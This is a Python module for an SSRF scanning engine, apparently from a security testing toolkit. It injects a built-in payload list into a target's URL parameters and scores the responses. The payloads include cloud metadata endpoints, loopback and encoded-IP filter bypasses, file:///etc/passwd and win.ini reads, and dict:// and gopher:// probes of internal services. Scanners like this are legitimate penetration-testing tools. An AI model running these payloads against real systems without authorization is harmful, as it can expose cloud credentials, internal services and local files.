from __future__ import annotations

"""
SSRF testing engine — PortSwigger / PayloadsAllTheThings class.

Covers: cloud metadata, localhost variants, decimal/hex/octal IP, DNS rebinding
candidates, file://, gopher/dict probes (as strings), redirect following signals.
"""


from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from .._http import http_request
from .. import policy
from .. import pat_data

# Destinations commonly used to prove SSRF
_TARGETS: list[dict[str, Any]] = [
    {"id": "meta-aws", "url": "http://169.254.169.254/latest/meta-data/", "tags": ["cloud", "aws"], "expect": ["ami-id", "instance-id", "meta-data"]},
    {"id": "meta-aws-imdsv2", "url": "http://169.254.169.254/latest/api/token", "tags": ["cloud", "aws"], "method": "PUT"},
    {"id": "meta-gcp", "url": "http://metadata.google.internal/computeMetadata/v1/", "tags": ["cloud", "gcp"], "headers": {"Metadata-Flavor": "Google"}, "expect": ["instance", "project"]},
    {"id": "meta-azure", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "tags": ["cloud", "azure"], "headers": {"Metadata": "true"}, "expect": ["compute", "network"]},
    {"id": "localhost-http", "url": "http://127.0.0.1/", "tags": ["loopback"], "expect": []},
    {"id": "localhost-name", "url": "http://localhost/", "tags": ["loopback"], "expect": []},
    {"id": "localhost-ipv6", "url": "http://[::1]/", "tags": ["loopback", "ipv6"], "expect": []},
    {"id": "localhost-0", "url": "http://0.0.0.0/", "tags": ["loopback"], "expect": []},
    {"id": "decimal-ip", "url": "http://2130706433/", "tags": ["bypass", "decimal"], "expect": []},  # 127.0.0.1
    {"id": "hex-ip", "url": "http://0x7f000001/", "tags": ["bypass", "hex"], "expect": []},
    {"id": "octal-ip", "url": "http://0177.0.0.1/", "tags": ["bypass", "octal"], "expect": []},
    {"id": "short-ip", "url": "http://127.1/", "tags": ["bypass"], "expect": []},
    {"id": "dotted-pad", "url": "http://127.0.0.1.nip.io/", "tags": ["dns"], "expect": []},
    {"id": "localtest-me", "url": "http://localtest.me/", "tags": ["dns"], "expect": []},
    {"id": "spoofed-domain", "url": "http://127.0.0.1.localtest.me/", "tags": ["dns"], "expect": []},
    {"id": "file-passwd", "url": "file:///etc/passwd", "tags": ["file"], "expect": ["root:"]},
    {"id": "file-win", "url": "file:///c:/windows/win.ini", "tags": ["file", "windows"], "expect": ["fonts", "extensions"]},
    {"id": "dict-redis", "url": "dict://127.0.0.1:6379/info", "tags": ["dict", "redis"], "expect": ["redis"]},
    {"id": "gopher-echo", "url": "gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.1%0D%0A%0D%0A", "tags": ["gopher"], "expect": []},
]

# Parameter names that often accept URLs
_URL_PARAMS = [
    "url", "uri", "path", "src", "source", "dest", "destination", "redirect",
    "redirect_uri", "redirect_url", "next", "return", "returnTo", "return_to",
    "continue", "data", "reference", "site", "html", "val", "validate",
    "domain", "callback", "target", "link", "feed", "host", "proxy", "fetch",
    "img", "image", "file", "document", "page", "u", "q",
]


def list_targets_pat():
    return {"payloads": pat_data.get("ssrf"), "count": len(pat_data.get("ssrf")), "source": "PayloadsAllTheThings/SSRF"}

def list_targets(tags: str = "") -> dict[str, Any]:
    want = {t.strip() for t in tags.split(",") if t.strip()} if tags else set()
    out = [t for t in _TARGETS if not want or want.intersection(set(t.get("tags") or []))]
    return {"count": len(out), "targets": out}


def _inject(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    q = dict(parse_qsl(p.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(p._replace(query=urlencode(q, doseq=True)))


def _score_body(body: str, expect: list[str]) -> dict[str, Any]:
    body_l = (body or "").lower()
    hits = [e for e in expect if e.lower() in body_l]
    # generic internal signals
    extra = []
    for sig in ("root:", "ami-id", "instance-id", "compute", "redis_version", "[fonts]", "metadata"):
        if sig in body_l:
            extra.append(sig)
    return {"expect_hits": hits, "signals": list(dict.fromkeys(hits + extra))}


async def scan(
    url: str,
    parameter: str = "",
    tags: str = "",
    max_targets: int = 12,
    max_payloads: int | None = None,
    user_agent: str = "pyodide-security/ssrf-engine/2.0",
) -> dict[str, Any]:
    if max_payloads is not None:
        max_targets = max_payloads
    err = policy.check_url_for_active(url)
    if err:
        return {"ok": False, "error": err, "engine": "ssrf"}

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    p = urlparse(url)
    params = dict(parse_qsl(p.query, keep_blank_values=True))
    param = parameter
    if not param:
        for candidate in _URL_PARAMS:
            if candidate in params:
                param = candidate
                break
        if not param:
            param = next(iter(params), "url")
            if param not in params:
                params[param] = "http://example.com/"

    headers = {"User-Agent": user_agent}
    pack = list_targets(tags=tags)
    targets = pack["targets"][: max(1, min(int(max_targets), 30))]

    findings = []
    tests = []
    for t in targets:
        if not policy.can_request():
            break
        dest = t["url"]
        test_url = _inject(url, param, dest)
        req_headers = dict(headers)
        req_headers.update(t.get("headers") or {})
        method = t.get("method") or "GET"
        resp = await http_request(test_url, method=method, headers=req_headers)
        body = resp.get("body") or ""
        scored = _score_body(body, t.get("expect") or [])
        status = int(resp.get("status") or 0)
        interesting = bool(scored["signals"]) or status not in (0, 404, 400)
        # strong signal: expect hits
        confidence = 40
        if scored["expect_hits"]:
            confidence = 90
        elif scored["signals"]:
            confidence = 70
        elif status in (200, 500) and len(body) > 0:
            confidence = 50

        entry = {
            "target_id": t["id"],
            "dest": dest,
            "tags": t.get("tags") or [],
            "param": param,
            "status": status,
            "confidence": confidence,
            "signals": scored["signals"],
            "expect_hits": scored["expect_hits"],
            "body_len": len(body),
            "body_preview": body[:300],
            "error": resp.get("error"),
            "elapsed_ms": resp.get("elapsed_ms"),
        }
        tests.append(entry)
        if interesting and confidence >= 50:
            findings.append(entry)

    findings.sort(key=lambda x: -x["confidence"])
    return {
        "ok": True,
        "url": url,
        "parameter": param,
        "tested": len(tests),
        "findings": findings,
        "tests": tests,
        "engine": "ssrf",
        "version": "2.0",
        "equivalent": "ssrfmap/payloads-all-the-things",
        "policy": policy.status(),
    }
